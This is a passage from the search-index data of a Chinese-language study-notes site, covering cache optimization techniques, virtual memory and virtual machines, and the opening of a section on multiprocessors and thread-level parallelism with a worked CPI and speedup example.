<li>\u66f4\u5c11\u7684\u786c\u4ef6\uff0c\u66f4\u4f4e\u7684\u547d\u4e2d\u7387</li> <li>\u6307\u4ee4\u548c\u6570\u636e\u8bbf\u95ee\u7ade\u4e89\u7f13\u5b58\u7aef\u53e3\u548c\u5e26\u5bbd</li> </ul> <ul> <li>\u6307\u4ee4\u548c\u6570\u636e\u5206\u5f00\u5b58\u50a8</li> <li>\u4e00\u822c\u662f L1 Cache \u5206\u5f00\uff0cL2 Cache \u7edf\u4e00</li> <li>\u6307\u4ee4\u6d41\u548c\u6570\u636e\u6d41\u72ec\u7acb\uff0c\u4e92\u4e0d\u5e72\u6270</li> </ul>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#optimization-of-cache","title":"Optimization of Cache","text":"<p>\u5c06\u7f13\u5b58\u4f18\u5316\u7684\u5341\u79cd\u9ad8\u7ea7\u65b9\u6cd5\u5206\u4e3a\u4ee5\u4e0b\u4e94\u7c7b\uff1a</p> <ul> <li>&lt;1&gt; Reducing Hit Time\uff082 + 2\uff09<ul> <li>Small, Simple L1 Cache \\ Way Prediction<ul> <li>\u8fd9\u4e24\u79cd\u6280\u672f\u901a\u5e38\u8fd8\u80fd\u964d\u4f4e\u529f\u8017</li> </ul> </li> <li>Avoiding Address Translation \\ Trace Cache</li> </ul> </li> <li>&lt;2&gt; Increasing Cache Bandwidth\uff083\uff09<ul> <li>Pipelined Cache \\ Multibanked Caches \\ Non-Blocking Caches(\u975e\u963b\u585e\u7f13\u5b58)</li> </ul> </li> <li>&lt;3&gt; Reducing Missing Penalty\uff083 + 2\uff09<ul> <li>Critical Word First(\u5173\u952e\u5b57\u4f18\u5148) \\ Merging Write Buffer(\u5408\u5e76\u5199\u7f13\u51b2) \\ Victim Caches<ul> <li>\u8fd9\u4e24\u79cd\u6280\u672f\u5bf9\u529f\u8017\u5f71\u54cd\u5f88\u5c0f</li> </ul> </li> <li>Multi-Level Cache \\ Read miss prior to writes</li> </ul> </li> <li>&lt;4&gt; Reducing Miss Rate\uff081 + 3\uff09<ul> <li>Compiler Optimizations(\u7f16\u8bd1\u5668\u4f18\u5316)<ul> <li>\u5728\u7f16\u8bd1\u65f6\u8fdb\u884c\u4f18\u5316\u663e\u7136\u80fd\u591f\u964d\u4f4e\u529f\u8017</li> </ul> </li> <li>Larger Block Size \\ Larger Cache Size \\ Higher Associativity</li> </ul> </li> <li>&lt;5&gt; Parallelism\uff082\uff09<ul> <li>Hardware Prefetching \\ Compiler Prefetching<ul> <li>\u7531\u4e8e\u63d0\u524d\u53d6\u51fa\u4e86\u672a\u4f7f\u7528\u7684\u6570\u636e\uff0c\u8fd9\u4e24\u79cd\u6280\u672f\u901a\u5e38\u4f1a\u589e\u52a0\u529f\u8017</li> </ul> </li> <li>\u901a\u8fc7\u5e76\u884c\u51cf\u5c0f Miss Penalty \u6216 Miss Rate</li> </ul> </li> </ul> <p>\u5efa\u8bae\u76f4\u63a5\u6284 A4 \u4e0a\uff0c\u5f88\u6709\u53ef\u80fd\u51fa\u9009\u62e9\u9898\uff0c\u5177\u4f53\u7684\u5185\u5bb9\u6700\u597d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b</p>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#reducing-hit-time","title":"Reducing Hit Time","text":"<p>Small and Simple Caches</p> <p>\u5c0f\u800c\u7b80\u5355\u7684\u7f13\u5b58\u3002</p> <ul> <li>\u786c\u4ef6\u5c0f\uff0c\u8bbf\u95ee\u901f\u5ea6\u81ea\u7136\u5feb\u3002</li> <li>\u76f4\u63a5\u6620\u5c04\u7684 Hit Time \u6bd4\u7ec4\u76f8\u8054\u66f4\u5feb</li> <li>\u51cf\u5c11\u82af\u7247\u548c Cache \u7684\u7269\u7406\u8ddd\u79bb\u4e5f\u662f\u66f4\u597d\u7684\u9009\u62e9</li> </ul> <p>Way Prediction</p> <p>\u7ec4\u76f8\u8054\u65f6\uff0c\u5728\u9ad8\u901f\u7f13\u5b58\u4e2d\u4fdd\u7559\u989d\u5916 bit \u7528\u6765\u8fdb\u884c Way-Prediction\uff0c\u9884\u6d4b\u4e0b\u4e00\u6b21\u53ef\u80fd\u88ab\u8bbf\u95ee\u7684\u8def\u3002</p> <ul> <li>\u5982\u679c\u9884\u6d4b\u9519\u8bef\uff0c\u53cd\u800c\u4f1a\u589e\u52a0 Hit Time</li> <li>\u52a0\u5927\u4e86\u9ad8\u901f\u7f13\u5b58\u8bbf\u95ee\u6d41\u6c34\u5316\u7684\u96be\u5ea6</li> <li>\u5173\u4e8e\u9884\u6d4b\u6b63\u786e\u7387\uff1a<ul> <li>(&gt; 90%) for two-way, (&gt; 80%) for four-way</li> <li>I-Cache &gt; D-Cache</li> </ul> </li> </ul> <p>Avoiding Address Translation</p> <ul> <li>\u865a\u62df\u5185\u5b58\u4f7f\u7528 TLB</li> <li>Cache \u7684\u4e09\u79cd\u5730\u5740\u8f6c\u6362\u65b9\u5f0f<ul> <li>PIPT: Physically Indexed, Physically Tagged<ul> <li>\u5373\u6211\u4eec\u4e4b\u524d\u6240\u8bb2\u7684 Cache\uff0c\u7f3a\u70b9\u662f\u4e0d\u7ba1 Cache \u662f\u5426\u547d\u4e2d\uff0c\u90fd\u8981\u5148\u7ecf\u8fc7 TLB \u6216 PTE \u8f6c\u6362\u5730\u5740</li> </ul> </li> <li>VIVT: Virtually Indexed, Virtually Tagged\uff0c\u53ef\u4ee5\u79f0\u4e3a Virtual Cache<ul> <li>\u6b67\u4e49 Ambiguity\uff1a\u4e24\u4e2a\u4e0d\u540c\u7684\u8fdb\u7a0b\u4f7f\u7528\u4e86\u76f8\u540c\u865a\u62df\u5730\u5740\uff0c\u5728 Virtual Cache \u4e2d\u5bf9\u5e94\u4e86\u540c\u4e00\u5757\uff08\u5b9e\u9645\u5e94\u8be5\u4e3a\u4e0d\u540c\u7269\u7406\u5730\u5740\uff09</li> <li>\u91cd\u540d Aliasing\uff1a\u4e00\u4e2a\u7269\u7406\u5730\u5740\u5bf9\u5e94\u4e86\u591a\u4e2a\u8fdb\u7a0b\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u5bfc\u81f4 Cache \u7684\u547d\u4e2d\u7387\u8f83\u4f4e\u4ee5\u53ca\u53ef\u80fd\u5b58\u5728\u7684 Dirty \u95ee\u9898</li> <li>\u4ee5\u4e0a\u4e24\u4e2a\u95ee\u9898\u7ef4\u62a4\u6210\u672c\u6781\u9ad8\uff0c\u56e0\u6b64\u57fa\u672c\u6ca1\u6709\u786c\u4ef6\u8fd8\u5728\u7528 VIVT Cache \u4e86\u3002</li> </ul> </li> <li>VIPT: Virtually Indexed, Physically Tagged<ul> <li>\u4f7f\u7528\u865a\u62df\u5730\u5740\u7684\u4e00\u90e8\u5206\u4f5c\u4e3a Cache \u7684 Index\uff1b\u4f7f\u7528\u7269\u7406\u5730\u5740\u7684\u4e00\u90e8\u5206\u4f5c\u4e3a Cache \u7684 Tag</li> <li>\u6b64\u65f6 VIPT \u65e2\u6709 PIPT \u7684\u6b63\u786e\u6027\uff0c\u53c8\u6709 VIVT \u7684\u901f\u5ea6</li> </ul> </li> </ul> </li> </ul> <p>VIPT \u4ec0\u4e48\u6761\u4ef6\u4e0b\u4e0d\u4f1a\u91cd\u540d\u8fd8\u5b58\u7591\uff0c\u6ca1\u641e\u660e\u767d</p> <p>Reference: \u5173\u4e8eCache\u7684\u6b67\u4e49/\u522b\u540d\u95ee\u9898\u548cVIVT/VIPT/PIPT\u67b6\u6784</p> <p></p> <p>Trace Cache</p> <p>\u8ffd\u8e2a\u9ad8\u901f\u7f13\u5b58\u662f\u4e00\u79cd\u7279\u6b8a\u7684 I-Cache\uff0c\u5b83\u4e0d\u5b58\u50a8\u7269\u7406\u4e0a\u8fde\u7eed\u7684\u6307\u4ee4\u5757\uff0c\u800c\u662f\u5b58\u50a8\u52a8\u6001\u6267\u884c\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u79f0\u4e3a Trace\u3002</p> <ul> <li>\u6839\u636e\u7a0b\u5e8f\u6267\u884c\u60c5\u51b5\u52a8\u6001\u8bb0\u5f55\u5b9e\u9645\u6307\u4ee4\u5e8f\u5217</li> <li>\u83b7\u53d6\u6307\u4ee4\u65f6\uff0c\u5904\u7406\u5668\u9996\u5148\u5728 Trace Cache \u4e2d\u641c\u7d22\uff0c\u5982\u679c\u547d\u4e2d\u5373\u53ef\u4e00\u6b21\u6027\u83b7\u53d6\u4e00\u4e2a\u65e0\u9700\u62c5\u5fc3\u5206\u652f\u9884\u6d4b\u7b49\u505c\u987f\u7684\u8f83\u957f\u6307\u4ee4\u5e8f\u5217</li> <li>\u7531\u4e8e\u5c40\u90e8\u6027\u539f\u7406\uff0c\u5927\u90e8\u5206\u5206\u652f\u9884\u6d4b\u90fd\u662f\u6b63\u786e\u7684</li> </ul>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#increase-cache-bandwidth","title":"Increase Cache Bandwidth","text":"<p>L1 Cache \u7684\u5e26\u5bbd\u9650\u5236\u4e86\u7a0b\u5e8f\uff0c\u56e0\u6b64\u4ee5\u4e0b\u4e09\u4e2a\u7b56\u7565\u4e00\u822c\u90fd\u5e94\u7528\u4e8e L1 Cache\u3002</p> <p>Pipelined Caches</p> <ul> <li>\u628a\u7f13\u5b58\u8bbf\u95ee\u7684\u8fc7\u7a0b\u6d41\u6c34\u7ebf\u5316\uff0c\u63d0\u9ad8\u541e\u5410\u91cf</li> <li>\u4f46\u662f\u4f1a\u589e\u52a0\u5206\u652f\u9884\u6d4b\u9519\u8bef\u7684 Penalty \u4ee5\u53ca\u63d0\u9ad8\u4e86 Latency</li> <li>\u540c\u6837\u5728 I-Cache \u4e0a\u66f4\u5bb9\u6613\u5b9e\u73b0</li> </ul> <p>Multi-Banked Caches</p> <ul> <li>\u628a\u7f13\u5b58\u5212\u5206\u4e3a\u591a\u4e2a\u72ec\u7acb\u7684 bank\uff0c\u6bcf\u4e2a bank \u90fd\u53ef\u88ab\u72ec\u7acb\u8bbf\u95ee\uff0c\u4ece\u800c\u589e\u52a0\u5e26\u5bbd</li> <li>\u5f53\u8bbf\u95ee\u5e8f\u5217\u6070\u597d\u6309\u7167 bank \u6570\u91cf\u5c55\u5f00\u65f6\uff0c\u5373\u5728\u8fd9\u4e9b bank \u4e2d\u5e73\u5747\u5206\u5e03\uff0c\u5e26\u5bbd\u63d0\u5347\u6700\u9ad8<ul> <li>\u56e0\u6b64\u8bbe\u8ba1\u8005\u8981\u8003\u8651\u5730\u5740\u600e\u4e48\u5206\u914d\u7ed9\u5404\u4e2a\u5206\u533a\uff0c\u4e00\u79cd\u7b80\u5355\u7b56\u7565\u662f Sequential Interleaving*</li> </ul> </li> </ul> <p></p> <p>Nonblocking Caches</p> <ul> <li>\u5982\u679c CPU \u652f\u6301\u4e71\u5e8f\u6267\u884c\uff0c\u53ef\u4ee5\u5b9e\u73b0 Hit Under Miss\uff0c\u5373 Cache Miss \u540e\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff0c\u4ece\u800c\u53d1\u6325\u51fa\u4e71\u5e8f\u6267\u884c\u7684\u4f18\u52bf<ul> <li>\u4e71\u5e8f\u6267\u884c\u7684 CPU \u4e0d\u4f1a\u56e0\u4e3a\u4e00\u4e2a\u90e8\u4ef6\u5931\u6548\u800c\u505c\u987f\uff0c\u4f8b\u5982\u5728\u7b49\u5f85 D-Cache Miss \u7684\u65f6\u5019\u8fd8\u80fd\u7ee7\u7eed\u4ece I-Cache \u4e2d\u83b7\u53d6\u6307\u4ee4</li> </ul> </li> <li>\u4e00\u4e2a Cache Line \u53ef\u4ee5\u540c\u65f6\u5904\u7406\u591a\u4e2a\u8bf7\u6c42</li> </ul> <p>\u901a\u5e38\uff0c\u80fd\u591f\u9690\u85cf L1 \u5931\u6548\u4f46\u662f L2 \u547d\u4e2d\u5e26\u6765\u7684 Penalty\uff0c\u4f46\u518d\u5f80\u4e0b\u53ef\u80fd\u4ecd\u7136\u65e0\u6cd5\u5b8c\u5168\u8986\u76d6\u5ef6\u8fdf</p> <pre><code>1: Reg1:=LoadMem(A);\n2: Reg2:=LoadMem(B);\n3: Reg3:=Reg1 + Reg2;\n</code></pre> <p>\u6267\u884c 1 \u65f6\uff0c\u53d1\u751f\u4e86 Cache Miss\uff0cCPU \u9700\u8981\u4ece\u4e3b\u5b58\u4e2d\u53d6\u6570\u636e\uff1b\u4f46\u8bfb\u4e3b\u5b58\u65f6\u95f4\u5f88\u957f\uff0c\u8fd9\u6bb5\u65f6\u95f4 CPU \u7ee7\u7eed\u6267\u884c 2\u3002</p> <p>\u5982\u679c 2 \u4e5f\u53d1\u751f\u4e86 Cache Miss\uff0c\u90a3\u4e48\uff0c\u591a\u4f59 Nonblocking Cache\uff0c\u5b83\u4f1a\u540c\u65f6\u53bb\u4e3b\u5b58\u4e2d\u8bfb B\uff0c\u6700\u7ec8 A \u548c B \u4e00\u8d77\u8fdb\u5165 Cache\u3002</p>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#reducing-missing-penalty","title":"Reducing Missing Penalty","text":"<p>Multi-Level Caches</p> <ul> <li>\u4e00\u7ea7\u7f13\u5b58\u53ef\u4ee5\u51cf\u5c11 hit time\uff0c\u4e8c\u7ea7\u7f13\u5b58\u53ef\u4ee5\u51cf\u5c11 miss penalty</li> <li>\u4e00\u7ea7\u7f13\u5b58\u7684 miss penalty \u5c31\u662f\u4e8c\u7ea7\u7f13\u5b58\u7684 AMAT</li> <li>\u533a\u5206\u4e24\u4e2a\u6982\u5ff5<ul> <li>Local Miss Rate: \u672c\u7ea7\u7f13\u5b58\u7684 Miss Rate\uff0c\u5373\u672c\u7ea7\u7684 Miss \u91cf\u9664\u4ee5\u5bf9\u672c\u7ea7\u7684\u603b\u8bbf\u95ee\u91cf</li> <li>Global Miss Rate: \u672c\u7ea7\u7684 Miss \u91cf\u9664\u4ee5 CPU \u7684\u603b\u8bbf\u95ee\u91cf</li> <li>Global Miss Rate &lt; Local Miss Rate</li> </ul> </li> </ul> <p>Giving Priority to Read Misses over Writes</p> <ul> <li>\u5982\u679c\u6709 Write Buffer\uff0c\u53ef\u4ee5\u6682\u7f13\u5904\u7406\u5199\u7f3a\u5931\uff0c\u4f18\u5148\u5904\u7406\u8bfb\u7f3a\u5931</li> <li>\u4f46\u662f\u5904\u7406\u8bfb\u7f3a\u5931\u65f6\u8981\u68c0\u67e5\u5199\u7f13\u51b2\u533a\uff0c\u786e\u4fdd\u6570\u636e\u7684\u4e00\u81f4\u6027</li> </ul> <p>Critical Word First &amp; Early Restart</p> <ul> <li>\u4e0d\u9700\u8981\u7b49\u5230\u4e00\u4e2a Block \u90fd\u4ece Cache \u4e2d\u53d6\u51fa\u6765\u4e4b\u540e\u518d\u6267\u884c\uff0c\u53ef\u4ee5\u4f18\u5148\u53d6\u51fa\u6211\u4eec\u9700\u8981\u7684 Word</li> <li>\u53d6\u51fa\u5173\u952e Word \u540e\uff0cCPU \u5373\u53ef\u91cd\u542f\u7ee7\u7eed\u6267\u884c\u4e86</li> </ul> <p>Merging Write Buffer</p> <ul> <li>\u53d1\u751f Write Miss \u65f6\uff0c\u5982\u679c\u8981\u5199\u7684\u5730\u5740\u6070\u597d\u5728 Write Buffer \u5185\uff0c\u5219\u76f4\u63a5\u5728 Write Buffer \u5185\u5199\uff0c\u8fd9\u4e00\u6b65\u9aa4\u53eb\u505a\u5199\u5408\u5e76 Write Merging</li> <li>\u4e00\u5b9a\u7a0b\u5ea6\u7f13\u89e3\u4e86 Write Buffer \u88c5\u6ee1\u65f6\u9020\u6210\u7684 Stall</li> </ul> <p>Victim Caches</p> <ul> <li>\u76f8\u5f53\u4e8e\u591a\u52a0\u4e00\u4e2a Level \u7684\u5c0f\u5bb9\u91cf\u5168\u76f8\u8054\u7f13\u5b58</li> <li>Cache \u4e2d Block \u88ab\u66ff\u6362\u65f6\uff0c\u4f1a\u628a\u8be5\u5757\u653e\u5165 Victim Cache \u4e2d</li> <li>\u5982\u679c\u4e0b\u6b21\u8981\u8bbf\u95ee\u7684\u65f6\u5019\u53d1\u73b0\u5728 Victim Cache \u4e2d\uff0c\u5c31\u53ef\u4ee5\u51cf\u5c11 Miss Penalty</li> </ul>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#reducing-miss-rate","title":"Reducing Miss Rate","text":"<p>\u56de\u987e\u4e00\u4e0b\u6211\u4eec\u7684 Miss Rate \u5206\u7c7b\uff0c\u5728\u8ba1\u7b97\u673a\u4f53\u7cfb\u4e2d\u6211\u4eec\u4f1a\u6d89\u53ca\u5982\u4e0b\u56db\u79cd\uff1a</p> <ul> <li>Compulsory Misses: \u51b7\u542f\u52a8 Miss\uff0c\u7b2c\u4e00\u6b21\u8bbf\u95ee\u6570\u636e\u65f6\u53d1\u751f\u7684\u7f3a\u5931</li> <li>Capacity Misses: \u5bb9\u91cf Miss\uff0c\u7f13\u5b58\u5bb9\u91cf\u4e0d\u8db3\u5bfc\u81f4\u7684\u7f3a\u5931</li> <li>Conflict Misses: \u51b2\u7a81 Miss\uff0c\u591a\u4e2a\u6570\u636e\u6620\u5c04\u5230\u540c\u4e00\u4e2a Cache Block \u5bfc\u81f4\u7684\u7f3a\u5931</li> <li>Coherence Misses: \u4e00\u81f4\u6027 Miss\uff0c\u591a\u4e2a Cache \u7684\u4e00\u81f4\u6027\u95ee\u9898\u5bfc\u81f4\u7684\u7f3a\u5931</li> </ul> <p>Block Size &amp; Cache Size &amp; Associativity</p> <ul> <li>Larger Block Size<ul> <li>\u5229\u7528\u7a7a\u95f4\u5c40\u90e8\u6027\uff0c\u51cf\u5c11\u4e86 Compulsory Misses</li> <li>\u4f46\u662f\u4f1a\u589e\u52a0 Miss Penalty</li> <li>(\u5728 Cache \u603b\u5927\u5c0f\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b)\u8fd8\u4f1a\u589e\u52a0 Conflict Misses \u751a\u81f3 Capacity Misses</li> </ul> </li> <li>Larger Cache Size<ul> <li>\u51cf\u5c11 Capacity Misses</li> <li>\u4ee3\u4ef7\u662f\u66f4\u9ad8\u7684 Hit Time\u3001\u66f4\u9ad8\u7684 Cost</li> </ul> </li> <li>Higher Associativity<ul> <li>\u51cf\u5c11 Conflict Misses</li> <li>\u7ecf\u9a8c\u6cd5\u5219\uff1a\u5927\u5c0f\u4e3a N \u7684\u76f4\u63a5\u6620\u5c04 Cache \u7684 Miss Rate \u7ea6\u7b49\u4e8e\u5927\u5c0f\u4e3a N/2 \u7684\u4e8c\u8def\u7ec4\u76f8\u8054 Cache \u7684 Miss Rate</li> <li>\u4e0d\u540c\u7684\u7ec4\u76f8\u8054\u5ea6\u53ef\u80fd\u4f1a\u5f71\u54cd Clock Cycle Time\uff0c\u4ece\u800c\u5f71\u54cd\u6574\u4f53\u6027\u80fd</li> </ul> </li> </ul> <p>Compiler Optimization</p> <p>\u4e0d\u505a\u786c\u4ef6\u4f18\u5316\uff0c\u53ea\u901a\u8fc7\u7f16\u8bd1\u5668\u4f18\u5316\u6765\u964d\u4f4e Miss Rate</p> <ul> <li>\u6307\u4ee4\u7ea7\u522b<ul> <li>\u6307\u4ee4\u91cd\u6392\u3001\u51b2\u7a81\u5206\u6790</li> </ul> </li> <li>\u6570\u636e\u7ea7\u522b<ul> <li>Merging Arrays \u6570\u7ec4\u5408\u5e76\uff0c\u4ee5\u63d0\u5347\u7a7a\u95f4\u5c40\u90e8\u6027</li> <li>Loop Interchange \u5faa\u73af\u4ea4\u6362\uff0c\u4ea4\u6362\u5185\u5916\u5c42\u5faa\u73af\uff0c\u6539\u8fdb\u7a7a\u95f4\u5c40\u90e8\u6027</li> <li>Loop Fusion \u5faa\u73af\u878d\u5408\uff0c\u5408\u5e76\u4e24\u4e2a\u5177\u6709\u76f8\u540c\u5faa\u73af\uff0c\u4e14\u90e8\u5206\u53d8\u91cf\u91cd\u53e0\u7684\u72ec\u7acb\u5faa\u73af</li> <li>Blocking \u6570\u636e\u5757\u5316\uff0c\u540c\u65f6\u5229\u7528\u4e86\u7a7a\u95f4\u5c40\u90e8\u6027\u548c\u65f6\u95f4\u5c40\u90e8\u6027</li> </ul> </li> </ul>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#parallelism","title":"Parallelism","text":"<p>Hardware Prefetching</p> <ul> <li>\u63d0\u524d\u628a\u6570\u636e\u548c\u6307\u4ee4\u653e\u5165 Cache \u4e2d</li> <li>\u80fd\u591f\u51cf\u5c11 Compulsory Misses</li> <li>\u7531\u4e8e\u53ef\u80fd\u628a\u6709\u7528\u7684 Block \u7684\u6324\u51fa Cache\uff0c\u4e5f\u8bb8\u4f1a\u589e\u52a0\u5176\u5b83 Miss</li> </ul> <p>Compiler-controlled Prefetch</p> <ul> <li>\u7531\u7f16\u8bd1\u5668\u63a7\u5236\u7684 Prefetch\uff0c\u771f\u6b63\u83b7\u53d6\u6570\u636e\u4e4b\u524d\uff0c\u63d2\u5165\u8bf7\u6c42\u6570\u636e\u7684\u9884\u53d6\u6307\u4ee4</li> <li>\u9700\u8981\u5728\u9884\u53d6\u7684\u5f00\u9500\u4e0e\u5176\u83b7\u5f97\u7684\u6027\u80fd\u4e4b\u95f4\u53d6\u5f97\u5e73\u8861</li> </ul>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#virtual-memory-virtual-machine","title":"Virtual Memory &amp; Virtual Machine","text":"<p>\u865a\u62df\u5185\u5b58\u90e8\u5206\u5728\u4f53\u7cfb\u7ed3\u6784\u4e2d\u6d89\u53ca\u8f83\u5c11\uff0c\u53ef\u89c1\u8ba1\u7ec4\u7b14\u8bb0</p> <p>\u865a\u62df\u673a\u6700\u65e9\u5728 20 \u4e16\u7eaa 60 \u5e74\u4ee3\u540e\u671f\u63d0\u51fa\uff0c\u591a\u5e74\u4ee5\u6765\u4e00\u76f4\u662f\u5927\u578b\u8ba1\u7b97\u673a\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u5e76\u57fa\u4e8e\u4ee5\u4e0b\u539f\u56e0\u5728\u8fd1\u5e74\u6765\u5f97\u5230\u5e7f\u6cdb\u5173\u6ce8\uff1a</p> <ul> <li>&lt;1&gt; \u9694\u79bb\u4e0e\u5b89\u5168\u5728\u73b0\u4ee3\u7cfb\u7edf\u7684\u91cd\u8981\u6027\u63d0\u9ad8</li> <li>&lt;2&gt; \u6807\u51c6\u64cd\u4f5c\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u4e0e\u53ef\u9760\u6027\u5b58\u5728\u95ee\u9898</li> <li>&lt;3&gt; \u591a\u7528\u6237\u5171\u4eab\u4e00\u4e2a\u8ba1\u7b97\u673a</li> <li>&lt;4&gt; \u5904\u7406\u5668\u6027\u80fd\u7684\u8fdb\u6b65\uff0c\u4f7f\u5f97\u865a\u62df\u673a\u7684\u5f00\u9500\u80fd\u591f\u63a5\u53d7</li> </ul> <p>\u5e7f\u4e49\u7684\u865a\u62df\u673a\u5305\u62ec\u63d0\u4f9b\u6807\u51c6\u8f6f\u4ef6\u63a5\u53e3\u7684\u4eff\u771f\u65b9\u6cd5\uff0c\u6bd4\u5982 Java VM\u3002\u672c\u4e66\u6240\u8bb2\u7684\u865a\u62df\u673a\u4e3b\u8981\u4e3a\u5728 ISA \u7ea7\u522b\u63d0\u4f9b\u5b8c\u6574\u7cfb\u7edf\u7ea7\u73af\u5883\u7684\u865a\u62df\u673a\u3002</p> <p>VM \u4f7f\u7528\u7684 ISA \u4e00\u822c\u4e0e\u5176\u5e95\u5c42\u786c\u4ef6\u5339\u914d\u3002\u5728\u4f20\u7edf\u5e73\u53f0\u4e0a\uff0c\u4e00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u62e5\u6709\u6240\u6709\u786c\u4ef6\u8d44\u6e90\uff0c\u4f46\u5728\u4f7f\u7528\u865a\u62df\u673a\u65f6\uff0c\u591a\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u5171\u4eab\u786c\u4ef6\u8d44\u6e90\u3002</p> <p>\u4e3a\u865a\u62df\u673a\u63d0\u4f9b\u652f\u6301\u7684\u8f6f\u4ef6\u79f0\u4e3a Virtual Machine Monitor \u6216 Hypervisor\u3002VMM \u51b3\u5b9a\u4e86\u5982\u4f55\u5c06\u865a\u62df\u8d44\u6e90\u6620\u5c04\u5230\u7269\u7406\u8d44\u6e90\uff0c\u5b83\u6bd4\u4f20\u7edf\u64cd\u4f5c\u7cfb\u7edf\u5c0f\u5f97\u591a\uff0c\u9694\u79bb\u90e8\u5206\u5927\u7ea6\u53ea\u6709 10 000 \u884c\u4ee3\u7801\u3002</p> <p>\u5904\u7406\u5668\u865a\u62df\u5316\u7684\u5f00\u9500\u53d6\u51b3\u4e8e\u5de5\u4f5c\u8d1f\u8f7d\uff0c\u7cfb\u7edf\u8c03\u7528\u5c11\uff0c\u5219\u865a\u62df\u5316\u6210\u672c\u5c0f</p>"},{"location":"Courses/CA/TLP/","title":"Thread-Level Parallelism","text":""},{"location":"Courses/CA/TLP/#thread-level-parallelism","title":"Thread-Level Parallelism","text":"<p> \u7ea6 1770 \u4e2a\u5b57  15 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Courses/CA/TLP/#multi-processor","title":"Multi-Processor","text":"<p>\u5355\u5904\u7406\u5668\u6027\u80fd\u6709\u9650\uff0c\u73b0\u4ee3U\u57fa\u672c\u90fd\u4e3a\u591a\u5904\u7406\u5668\uff0c\u5b83\u5c5e\u4e8e MIMD \u67b6\u6784\uff0c\u6bcf\u4e2a\u5904\u7406\u5668 Fetch \u81ea\u5df1\u7684\u6307\u4ee4\uff0c\u5bf9\u81ea\u5df1\u7684\u6570\u636e\u6d41\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u591a\u5904\u7406\u5668\u6839\u636e Memory Model \u7684\u4e0d\u540c\u53ef\u5206\u4e3a UMA \u548c NUMA \u4e24\u79cd\uff1a</p> <p></p> <p>\u5176\u6700\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e Processor \u548c Memory \u4e4b\u95f4\u7684\u4f4d\u7f6e\u5173\u7cfb\u3002\u5bf9\u4e8e UMA\uff0c\u4e00\u4e2a\u5904\u7406\u5668\u8bbf\u95ee\u4efb\u4f55 Memory \u90fd\u662f\u7b49\u5ef6\u8fdf\u7684\uff0c\u4f46\u662f\u968f\u7740\u7cfb\u7edf\u7684\u589e\u5927\uff0c\u5176\u5ef6\u8fdf\u663e\u8457\u589e\u5927\uff1b\u5bf9\u4e8e NUMA\uff0c\u4e00\u4e2a\u5904\u7406\u5668\u8bbf\u95ee\u79bb\u5b83\u6700\u8fd1\u7684 Memory \u6700\u5feb\uff0c\u8bbf\u95ee\u522b\u7684 Memory \u9700\u8981\u7ecf\u8fc7 Interconnect \u4e2d\u8f6c\uff0c\u8fd9\u4e00\u67b6\u6784\u66f4\u9002\u7528\u4e8e Large Multiprocessor Systems\uff0c\u652f\u6301\u66f4\u591a\u7684 Cores\u3002</p> <p>\u6ce8\u610f\u662f\u5230 Memory \u7684 Latency\uff0c\u4e0d\u662f\u5230 Cache\u3002\u56e0\u6b64\u4e0a\u8ff0\u4e24\u79cd\u6a21\u578b\u5bf9\u5e94\u4e0b\u9762\u4e24\u79cd\u591a\u6838\u67b6\u6784</p> Symmetric Shared-Memory Multiprocessor, SMPDistributed Shared-Memory Multiprocessor, DSP <p></p> <p></p> <p>\u591a\u5904\u7406\u5668\u6838\u4e0e\u6838\u4e4b\u95f4\u7684\u7f16\u7a0b\u6a21\u578b\u53ef\u4ee5\u5206\u4e3a\u56db\u79cd\uff1a</p> <ul> <li>&lt;1&gt; Multiprogramming: \u65e0\u4ea4\u6d41</li> <li>&lt;2&gt; Shared Address Space: \u901a\u8fc7\u5185\u5b58\u5171\u4eab</li> <li>&lt;3&gt; Message Passing: \u901a\u8fc7\u6d88\u606f\u4f20\u9012</li> <li>&lt;4&gt; Data Parallel: \u5728\u4e0d\u540c\u6570\u636e\u4e0a\u540c\u65f6\u5904\u7406\uff0c\u5e76\u5168\u5c40\u5b9e\u65f6\u4ea4\u6362\u4fe1\u606f</li> </ul> <p>\u5904\u7406\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u5b58\u5728\u4e00\u5b9a\u5ef6\u8fdf\uff0c\u5728\u786c\u4ef6\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7f13\u5b58\u5171\u4eab\u6570\u636e\uff0c\u8fd9\u9700\u8981\u89e3\u51b3\u7f13\u5b58\u4e00\u81f4\u6027\u7684\u95ee\u9898\u3002\u800c\u5728\u8f6f\u4ef6\u4e0a\uff0c\u5219\u4f7f\u7528\u540c\u6b65 Synchronization\u3002</p> <p>High Communication Cost</p> \u9898\u9762\u89e3\u7b54 <p>How much faster if no communication vs if 0.2\\% remote ref?</p> <ul> <li>App running on a 32-processor MP;</li> <li>100 ns for reference to a remote mem;</li> <li>clock rate 4.0 GHz;</li> <li>base CPI 0.5;</li> </ul> \\[\\begin{array}l CPI &amp;  = Base\\ CPI + Remote\\ Rate \\times Remote\\ Cost \\\\ &amp; =  0.5 + 0.2\\% \\times \\frac{100ns}{0.25ns} = 1.3 \\\\ Speedup &amp; = \\frac{1.3}{0.5} = 2.6 \\end{array}\\]"},{"location":"Courses/CA/TLP/#cache-coherence","title":"Cache Coherence","text":"<p>\u7f13\u5b58\u4e00\u81f4\u6027\u662f\u7b2c\u4e94\u7ae0\u6700\u91cd\u8981\u7684\u5185\u5bb9</p> <p>\u5728 Shared Memory 